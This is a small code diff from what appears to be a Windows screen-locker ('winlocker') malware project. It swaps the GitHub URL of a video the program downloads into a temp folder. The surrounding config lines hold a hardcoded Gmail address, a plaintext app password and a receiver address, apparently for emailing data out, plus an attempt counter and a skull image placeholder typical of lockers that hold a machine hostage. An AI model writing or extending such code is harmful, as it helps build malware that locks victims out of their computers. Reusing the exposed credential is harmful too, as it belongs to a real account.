@@ -18,7 +18,7 @@ SKULL_BASE64 = "YOUR_BASE64_HERE"
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
-VIDEO_URL = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/video.mp4"
+VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/video.mp4"
 VIDEO_PATH = os.path.join(tempfile.gettempdir(), "dedsek_video.mp4")
 
 attempts_left = MAX_ATTEMPTS
